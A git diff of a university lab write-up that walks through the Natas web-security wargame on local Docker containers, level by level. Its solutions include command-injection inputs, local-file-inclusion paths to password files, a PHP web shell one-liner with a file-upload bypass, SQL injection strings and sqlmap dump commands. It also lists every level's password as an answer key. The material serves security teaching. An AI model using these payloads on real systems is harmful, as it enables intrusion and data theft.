@@ -1,26 +1,28 @@
 # Natas Wargame - Web Security Challenge Lab
 
-**Web Application Security Vulnerability Assessment**  
-*University of San Diego - Network Security Engineering*  
-*Docker-based Web Security Training Environment*
+**Web Application Security Vulnerability Analysis and Exploitation**  
+*University of San Diego Student Lab - July 30, 2025*  
+*Network Security Engineering Course*
 
 ## Objective
 
-This lab introduces common web security vulnerabilities through progressive challenges. Students learn to identify and exploit vulnerabilities including HTTP authentication bypass, directory traversal, command injection, SQL injection, file upload attacks, and XSS. Each level builds upon previous knowledge to develop comprehensive web application security assessment skills.
+This lab introduces common web security vulnerabilities through progressive challenges. Students learn to identify and exploit security flaws including HTTP authentication bypasses, directory traversal, command injection, SQL injection, file upload vulnerabilities, and session management weaknesses. Each level builds upon previous concepts while introducing new attack vectors and defense considerations.
 
 ## Prerequisites
 
 - Basic understanding of HTTP protocol and web applications
 - Familiarity with browser developer tools
+- Command line experience (curl, grep, basic shell commands)
 - Docker and Docker Compose installed
-- Command line proficiency (curl, basic scripting)
-- Understanding of OSI model application layer concepts
+- Text editor or hex editor for file manipulation
+- Optional: Burp Suite or similar web proxy tool
+- Optional: SQLmap for automated SQL injection testing
 
 ## Lab Setup
 
 ### Step 1: Download Required Files
-Download the provided lab materials:
-- `natas.tar.gz` - Docker images archive
+Download the compressed lab environment:
+- `natas.tar.gz` - Contains 3 Docker images
 - `Student_Instructions.md.docx` - Installation guide
 
 ### Step 2: Load Docker Images
@@ -30,181 +32,156 @@ docker load -i natas-mysql-2.tar
 docker load -i natas-web-2.tar
 ```
 
-### Step 3: Start Services
+### Step 3: Start Lab Environment
 ```bash
 docker stop natas-web-1 natas-mysql-1
 docker-compose -f docker-compose-new.yml up -d
 ```
 
-### Step 4: Verify Access
-Navigate to `http://localhost:5001` and `http://localhost:8080` to confirm services are running.
+### Step 4: Access Lab Interface
+Navigate to: `http://localhost:5001`
+
+Test credentials:
+- ErwinBruno:username / ErwinBruno@gmail.com
+- username1:username / secret1@email.com
 
 ## Challenge Progression
 
-### Level 0-1: Basic Source Code Analysis
-**Initial Credentials:** `natas0:xelpUVCjxnHOUtH9g3uZNyXX3PbBkBIp`
+### Level 0: Basic Source Code Analysis
+**Objective**: Introduction to client-side information disclosure
 
-**Solution Method:**
 ```bash
-# Right-click page → View Page Source
-# Look for HTML comments containing credentials
+# Access level
+Username: natas0
+Password: xelpUVCjxnHOUtH9g3uZNyXX3PbBkBIp
 ```
 
-**Result:** `natas1:cx0Ug2XQ2GpP31e6m82vjF0AbjHjSJRg`
+**Solution**: Right-click → View Page Source
+**Flag**: `cx0Ug2XQ2GpP31e6m82vjF0AbjHjSJRg`
 
-### Level 2: Developer Tools Investigation
-**Technique:** Browser developer tools (F12 or Ctrl+Shift+I)
+### Level 1: Developer Tools Bypass
+**Objective**: Circumventing right-click restrictions
 
-**Result:** `natas2:c3cQqNMP9kbCovsRGhsgXyzzt2uFkgqa`
+**Solution**: Use F12 or Ctrl+Shift+I to access Developer Tools
+**Flag**: `c3cQqNMP9kbCovsRGhsgXyzzt2uFkgqa`
 
-### Level 3: Directory Traversal
-**Method:** Analyze source for file paths, navigate to `/files` directory
+### Level 2: Directory Traversal
+**Objective**: Exploring web directory structure
 
-**Solution:**
+**Solution**: Navigate to `/files/` directory via URL manipulation
+**Flag**: `jvwZ87y3RYR4QGZUFgXmWlLZnxz9J1ZE`
+
+### Level 3: Robots.txt Analysis
+**Objective**: Understanding search engine exclusion files
+
 ```bash
-# Navigate to http://localhost:8080/natas2/files/
-# Examine users.txt file for credentials
-```
-
-**Result:** `natas3:jvwZ87y3RYR4QGZUFgXmWlLZnxz9J1ZE`
-
-### Level 4: Robots.txt Analysis
-**Technique:** Web crawler prevention file examination
-
-**Solution:**
-```bash
-# Check robots.txt file
 curl http://localhost:8080/natas3/robots.txt
-# Navigate to discovered /s3cr3t directory
 ```
 
-**Result:** `natas4:aiAYWOl77qltSYyJkfXmajoyKCTpshYr`
+**Solution**: Check `/s3cr3t/` directory revealed in robots.txt
+**Flag**: `aiAYWOl77qltSYyJkfXmajoyKCTpshYr`
 
-### Level 5: HTTP Referer Manipulation
-**Vulnerability:** Referer header validation bypass
+### Level 4: HTTP Referer Manipulation
+**Objective**: Bypassing referer-based access controls
 
-**Solution:**
 ```bash
 curl -u natas4:aiAYWOl77qltSYyJkfXmajoyKCTpshYr \
      -H "Referer: http://localhost:8080/natas5/" \
      http://localhost:8080/natas4/
 ```
 
-**Result:** `natas5:ZQ4Z1oIOtMCyoQkVpKOLpTRGPdBvfEJ2`
+**Flag**: `ZQ4Z1oIOtMCyoQkVpKOLpTRGPdBvfEJ2`
 
-### Level 6: Cookie Manipulation
-**Technique:** Client-side authentication bypass
+### Level 5: Cookie Manipulation
+**Objective**: Session state tampering
 
-**Solution:**
+**Solution**: Change cookie `loggedin: 0` to `loggedin: 1`
+**Flag**: `JE39QTZnzjToPaQq1q1jJuphVxdObMST`
+
+### Level 6: Include File Discovery
+**Objective**: Local file inclusion vulnerability
+
+**Solution**: Access `http://localhost:8080/natas6/includes/secret.inc`
+**Secret**: `FOEIUWGHFEEUHOFUOIU`
+**Flag**: `zLzx2id4WYHzyxmmceevO63UPzuyNQya`
+
+### Level 7: Path Traversal via Parameters
+**Objective**: Exploiting file inclusion through URL parameters
+
 ```bash
-# Modify cookie parameter: loggedin=0 → loggedin=1
-# Use browser developer tools → Application → Cookies
+# Access password file directly
+http://localhost:8080/natas7/index.php?page=/etc/natas_webpass/natas8
 ```
 
-**Result:** `natas6:JE39QTZnzjToPaQq1q1jJuphVxdObMST`
+**Flag**: `3KlEdmRfcUpFcPo2sgx9XBqP8Y6xj7uK`
 
-### Level 7: File Inclusion Discovery
-**Method:** Source code analysis reveals include path
+### Level 8: Multi-stage Encoding
+**Objective**: Reverse engineering encoded data
 
-**Solution:**
 ```bash
-# Navigate to http://localhost:8080/natas6/includes/secret.inc
-# Extract secret: FOEIUWGHFEEUHOFUOIU
-```
-
-**Result:** `natas7:zLzx2id4WYHzyxmmceevO63UPzuyNQya`
-
-### Level 8: Local File Inclusion (LFI)
-**Vulnerability:** Direct file access via URL parameters
-
-**Solution:**
-```bash
-# URL: http://localhost:8080/natas7/index.php?page=/etc/natas_webpass/natas8
-```
-
-**Result:** `natas8:3KlEdmRfcUpFcPo2sgx9XBqP8Y6xj7uK`
-
-### Level 9: Encoding Chain Reversal
-**Technique:** Multi-step decoding (hex → reverse → base64)
-
-**Solution:**
-```bash
+# Decode hex -> binary -> reverse -> base64
 echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
 ```
 
-**Result:** `natas9:V097z4qcLPapOrHJJ7E3CDkqWzUP5mt0`
+**Flag**: `V097z4qcLPapOrHJJ7E3CDkqWzUP5mt0`
 
-### Level 10: Command Injection
-**Vulnerability:** Unfiltered user input in shell commands
+### Level 9: Command Injection
+**Objective**: Exploiting unsanitized input in shell commands
 
-**Solution:**
 ```bash
 # Input: |cat /etc/natas_webpass/natas10
-# Exploits passthru("grep -i $key dictionary.txt")
+# Results in: grep -i |cat /etc/natas_webpass/natas10 dictionary.txt
 ```
 
-**Result:** `natas10:oEu2vdmkINvL5VxafnCf3smQbTYQqscj`
+**Flag**: `oEu2vdmkINvL5VxafnCf3smQbTYQqscj`
 
-### Level 11: Filtered Command Injection
-**Technique:** Bypass character filtering using grep functionality
+### Level 10: Filtered Command Injection
+**Objective**: Bypassing basic input filtering
 
-**Solution:**
 ```bash
 # Input: a /etc/natas_webpass/natas11
 # Uses grep's multiple file argument feature
 ```
 
-**Result:** `natas11:Pu9UWR8Ei5O0ANvSiP4idbLfaMRA7sHr`
+**Flag**: `Pu9UWR8Ei5O0ANvSiP4idbLfaMRA7sHr`
 
-### Level 12: Cookie Encryption/XOR Attack
-**Method:** XOR key recovery and cookie tampering
+### Level 11: XOR Cookie Decryption
+**Objective**: Breaking XOR encryption and cookie tampering
 
-**Solution Process:**
-1. Extract encrypted cookie
-2. Recover XOR key: `qw8J`
-3. Modify data: `showpassword=yes`
-4. Re-encrypt and set cookie
+**Solution**: Extract cookie, decrypt with XOR, modify showpassword=yes, re-encrypt
+**Key**: `qw8J`
+**Flag**: `RL5C33ZfMLiRoagzonsgKnSmAzZ6Wafv`
 
-**Result:** `natas12:RL5C33ZfMLiRoagzonsgKnSmAzZ6Wafv`
+### Level 12: File Upload Vulnerability
+**Objective**: Bypassing file type restrictions
 
-### Level 13: File Upload - PHP Execution
-**Vulnerability:** Unrestricted file upload with execution
-
-**Solution:**
 ```php
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
-Upload as .jpg, intercept request, change extension to .php
 
-**Result:** `natas13:icskyy3mbCWmUZs7h72xCsD1GFGtkJgz`
+**Solution**: Upload PHP file, intercept request, change extension from .jpg to .php
+**Access**: `/natas12/upload/[filename].php?cmd=cat%20/etc/natas_webpass/natas13`
+**Flag**: `icskyy3mbCWmUZs7h72xCsD1GFGtkJgz`
 
-### Level 14: File Upload - Magic Bytes Bypass
-**Technique:** PHP polyglot with JPEG header
+### Level 13: Magic Bytes Bypass
+**Objective**: Advanced file upload filtering evasion
 
-**Solution:**
-```bash
-# Prepend FF D8 FF E0 (JPEG magic bytes) to PHP payload
-# Upload and access with cmd parameter
-```
+**Solution**: Create PHP polyglot with JPEG header (FF D8 FF E0)
+**Flag**: `M5EFjJPoZfeUFy6StflnZPk6VuZxgsv1`
 
-**Result:** `natas14:M5EFjJPoZfeUFy6StflnZPk6VuZxgsv1`
+### Level 14: SQL Injection Authentication Bypass
+**Objective**: Breaking database authentication
 
-### Level 15: SQL Injection Authentication Bypass
-**Vulnerability:** Unfiltered SQL query construction
-
-**Solution:**
 ```sql
-# Username: " OR 1=1 #
-# Password: test
-# Resulting query bypasses authentication
+-- Input: " OR 1=1 #
+-- Results in: SELECT * FROM users WHERE username="" OR 1=1 # AND password="test"
 ```
 
-**Result:** `natas15:NYPI7EbUzgGVlDYqkLNGpb2bWwssSJBI`
+**Flag**: `NYPI7EbUzgGVlDYqkLNGpb2bWwssSJBI`
 
-### Level 16+: Advanced SQL Injection
-**Technique:** Automated blind SQL injection
+### Level 15: Blind SQL Injection
+**Objective**: Data extraction without direct output
 
-**Solution:**
 ```bash
 sqlmap -u "http://localhost:8080/natas15/?username=*" \
        --auth-type Basic \
@@ -214,74 +191,103 @@ sqlmap -u "http://localhost:8080/natas15/?username=*" \
        --dbms=mysql -p username --dump
 ```
 
-## Cleanup
+**Flag**: `dcfQN47g8Jk0Fkwn9fHz7VSaRn0YQYYG`
 
-### Stop Services
+### Level 16: Blind Command Injection
+**Objective**: Side-channel attack via command injection
+
+**Solution**: Use grep behavior differences to extract password character by character
+**Flag**: `VbZXCRbVWMc89uC177ABgy1GZOWXh9xh`
+
+### Level 17: Time-based Blind SQL Injection
+**Objective**: Database exploitation without visible feedback
+
 ```bash
-docker-compose -f docker-compose-new.yml down
+sqlmap -u "http://localhost:8080/natas17/" \
+       --data=username=natas18 \
+       --auth-type=Basic \
+       --auth-cred="natas17:VbZXCRbVWMc89uC177ABgy1GZOWXh9xh" \
+       --technique=T --level=5 --risk=1 \
+       --dbms=MySQL -D natas17 -T users -p username --dump
 ```
 
-### Remove Images (Optional)
+**Flag**: `8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`
+
+### Level 18: Session ID Prediction
+**Objective**: Weak session management exploitation
+
+**Solution**: Change PHPSESSID cookie to `1` (admin session)
+**Flag**: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`
+
+## Cleanup
+
 ```bash
-docker rmi natas-web:latest natas-mysql-with-setup:latest
+docker-compose -f docker-compose-new.yml down
+docker system prune -f
 ```
 
 ## Results and Observations
 
 ### Key Findings
-* Web applications commonly suffer from input validation failures
-* Client-side security controls are easily bypassed
-* File upload mechanisms require strict validation and sandboxing
-* SQL injection remains prevalent in database-driven applications
-* Cookie-based authentication systems are vulnerable to tampering
 
-### Technical Observations
-* Command injection occurs when user input reaches shell execution functions
-* Directory traversal exploits inadequate path filtering
-* XOR encryption with known plaintext is cryptographically weak
-* HTTP headers like Referer can be arbitrarily manipulated by attackers
+* Client-side security controls are easily bypassed through browser tools
+* Directory traversal vulnerabilities allow unauthorized file system access
+* Command injection occurs when user input is directly passed to system commands
+* SQL injection remains prevalent in applications with poor input validation
+* File upload restrictions can be circumvented through various techniques
+* Session management weaknesses enable privilege escalation
+* XOR encryption without proper key management is cryptographically weak
+
+### Attack Vector Analysis
+
+**Information Disclosure**: Source code comments, directory listings, and configuration files frequently contain sensitive data
+**Input Validation Failures**: Lack of sanitization enables command injection and SQL injection attacks
+**Authentication Bypasses**: Weak session handling and client-side controls allow unauthorized access
+**File System Access**: Path traversal and local file inclusion provide system-level access
 
 ## Real-World Implications
 
 ### Web Application Security
-These vulnerabilities represent common attack vectors in production environments. Organizations frequently encounter similar issues in custom applications, legacy systems, and third-party integrations.
+These vulnerabilities represent common issues in production web applications. Organizations frequently suffer data breaches due to similar implementation flaws, particularly in custom-developed applications and legacy systems.
 
 ### Organizations at Risk
-* E-commerce platforms with file upload functionality
-* Content management systems with dynamic includes
-* Web applications using basic authentication mechanisms
-* Database-driven sites without parameterized queries
+* E-commerce platforms with user-generated content
+* Financial services with web portals
+* Healthcare systems processing patient data
+* Educational institutions with student information systems
+* Government agencies with citizen-facing applications
 
 ### Business Impact
-Successful exploitation can lead to data breaches, system compromise, unauthorized access to sensitive information, and complete application takeover.
+Successful exploitation can result in data theft, system compromise, regulatory violations, financial losses, and reputation damage. The OWASP Top 10 consistently includes many of these vulnerability classes.
 
 ## Defense Strategies
 
 ### Technical Mitigations
-* Implement strict input validation and output encoding
-* Use parameterized queries for database interactions
+* Implement proper input validation and output encoding
+* Use parameterized queries to prevent SQL injection
 * Apply principle of least privilege for file system access
-* Employ secure session management and strong authentication
-* Configure proper HTTP security headers
+* Implement secure session management with proper randomization
+* Use Content Security Policy (CSP) headers
+* Deploy Web Application Firewalls (WAF) for additional protection
 
 ### Infrastructure Solutions
-* Deploy Web Application Firewalls (WAF)
-* Implement network segmentation
-* Use automated vulnerability scanning
-* Establish secure development lifecycle practices
-* Regular security assessments and penetration testing
+* Regular security code reviews and penetration testing
+* Automated vulnerability scanning in CI/CD pipelines
+* Runtime Application Self-Protection (RASP) deployment
+* Network segmentation and monitoring
+* Security-focused development training for developers
 
 ## Educational Value
 
 This lab demonstrates:
 * Progressive complexity in web vulnerability exploitation
-* Practical application of OWASP Top 10 security risks
-* Hands-on experience with common attack techniques
-* Development of systematic security assessment methodology
-* Integration of multiple tools and techniques for comprehensive testing
+* Practical application of HTTP protocol knowledge
+* Critical thinking skills for security analysis
+* Tool usage for security testing and validation
+* Real-world attack methodology and defense planning
+* Integration of multiple vulnerability types in attack chains
 
 ## Disclaimer
 
 ⚠️ **For Educational Purposes Only**
-
-This lab is designed exclusively for educational use within the University of San Diego Network Security Engineering course. All techniques demonstrated should only be applied in authorized testing environments. Unauthorized use of these methods against systems without explicit permission is illegal and unethical.
+This lab is designed exclusively for educational use within the University of San Diego Network Security Engineering course. All techniques demonstrated should only be applied in controlled environments with proper authorization. Unauthorized access to computer systems is illegal and unethical.
